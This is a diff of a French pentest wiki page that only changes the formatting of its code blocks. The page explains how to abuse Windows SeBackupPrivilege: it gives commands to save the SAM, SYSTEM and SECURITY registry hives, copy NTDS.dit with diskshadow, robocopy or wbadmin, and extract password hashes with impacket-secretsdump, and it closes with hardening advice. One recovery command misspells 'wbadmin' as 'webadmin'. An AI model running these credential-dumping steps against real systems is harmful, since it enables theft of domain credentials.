@@ -7767,58 +7767,58 @@
 <p>Le privilège SeBackup donne droit à l'utilisateur d'effectuer des sauvegardes. Le principe pour exploiter ce privilège est donc d'effectuer des sauvegardes du registre/de fichiers sensibles/etc afin d'obtenir les informations voulues.</p>
 <h3 id="si-le-privilege-est-disabled">Si le privilège est "disabled"</h3>
 <p>https://github.com/giuliano108/SeBackupPrivilege</p>
-<pre><code class="language-powershell">Import-Module .\SeBackupPrivilegeUtils.dll
-Import-Module .\SeBackupPrivilegeCmdLets.dll
-</code></pre>
-<pre><code class="language-powershell">Set-SeBackupPrivilege
-Get-SeBackupPrivilege
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Set-SeBackupPrivilege</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">Get-SeBackupPrivilege</span>
+</span></code></pre></div>
 <p>Ce qui permettra d'activer le privilège.</p>
 <h3 id="sauvegarde-du-registre">Sauvegarde du registre</h3>
 <p>Une sauvegarde du registre va permettre de récupérer les hash présents dans la SAM.</p>
-<pre><code class="language-cmd">reg save HKLM\SECURITY security.save
-reg save HKLM\SYSTEM system.save
-reg save HKLM\SAM sam.save
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>reg save HKLM\SECURITY security.save
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>reg save HKLM\SYSTEM system.save
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>reg save HKLM\SAM sam.save
+</span></code></pre></div>
 <p>Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash:</p>
-<pre><code class="language-bash">impacket-secretsdump -security security.save -system system.save -sam sam.save local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>impacket-secretsdump<span class="w"> </span>-security<span class="w"> </span>security.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>-sam<span class="w"> </span>sam.save<span class="w"> </span><span class="nb">local</span>
+</span></code></pre></div>
 <h3 id="sauvegarde-du-fichier-ntdsdit">Sauvegarde du fichier NTDS.dit</h3>
 <p>Plusieurs méthodes sont possibles selon le contexte.</p>
 <h4 id="diskshadow-et-robocopy">Diskshadow et robocopy</h4>
 <p>Création d'un script "backup.txt" pour diskshadow:</p>
-<pre><code class="language-cmd">set verbose on  
-set metadata C:\Windows\Temp\meta.cab  
-set context clientaccessible  
-set context persistent  
-begin backup  
-add volume C: alias cdrive  
-create  
-expose %cdrive% E:  
-end backup
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>set verbose on  
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>set metadata C:\Windows\Temp\meta.cab  
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>set context clientaccessible  
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>set context persistent  
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>begin backup  
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>add volume C: alias cdrive  
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>create  
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>expose %cdrive% E:  
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>end backup
+</span></code></pre></div>
 <p>puis l'exécuter:</p>
-<pre><code class="language-cmd">diskshadow /s .\backup.txt
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>diskshadow /s .\backup.txt
+</span></code></pre></div>
 <p>Ceci va créer une réplique de C:\ sur le lecteur E:\ =&gt; les fichiers de E:\ sont ensuite copiables.</p>
-<pre><code class="language-cmd">robocopy /b E:\Windows\ntds . ntds.dit
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>robocopy /b E:\Windows\ntds . ntds.dit
+</span></code></pre></div>
 <p>Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash:</p>
-<pre><code class="language-bash">impacket-secretsdump -system system.save -ntds ntds.dit local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>impacket-secretsdump<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span><span class="nb">local</span>
+</span></code></pre></div>
 <h4 id="wbadmin">Wbadmin</h4>
 <p>Wbadmin permet de créer un backup:</p>
-<pre><code class="language-cmd">wbadmin start backup -quiet -backuptarget:\\dc01\c$\temp -include:c:\windows\ntds
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>wbadmin start backup -quiet -backuptarget:\\dc01\c$\temp -include:c:\windows\ntds
+</span></code></pre></div>
 <p>On récupère ensuite la version du backup:</p>
-<pre><code class="language-cmd">wbadmin get versions
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>wbadmin get versions
+</span></code></pre></div>
 <p>Puis on la restore à un endroit accessible:</p>
-<pre><code class="language-cmd">webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
+</span></code></pre></div>
 <p>Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash:</p>
-<pre><code class="language-bash">impacket-secretsdump -system system.save -ntds ntds.dit local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>impacket-secretsdump<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span><span class="nb">local</span>
+</span></code></pre></div>
 <h3 id="contrer-les-abus-de-sebackupprivilege">Contrer les abus de SeBackupPrivilege</h3>
 <p>Pour sécuriser un système contre les abus de ce privilège:</p>
 <ul>
@@ -7872,7 +7872,7 @@ end backup
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
